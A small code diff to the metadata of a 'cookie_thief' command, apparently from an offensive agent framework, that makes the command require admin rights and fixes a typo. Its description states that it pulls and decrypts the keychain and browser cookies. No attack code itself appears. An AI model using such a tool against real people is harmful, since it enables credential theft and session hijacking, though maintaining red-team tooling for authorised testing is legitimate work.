@@ -38,9 +38,9 @@ class CookieThiefArguments(TaskArguments):
 
 class CookieThiefCommand(CommandBase):
     cmd = "cookie_thief"
-    needs_admin = False
+    needs_admin = True
     help_cmd = "cookie_thief {user account password} {browser}"
-    description = "Downloads the keychain db and browser cookies, decryots the keychain, extracts the cookie key and decrypts the cookies."
+    description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
     version = 1
     supported_ui_features = ["file_browser:download"] #CHANGE
     author = "@antman"
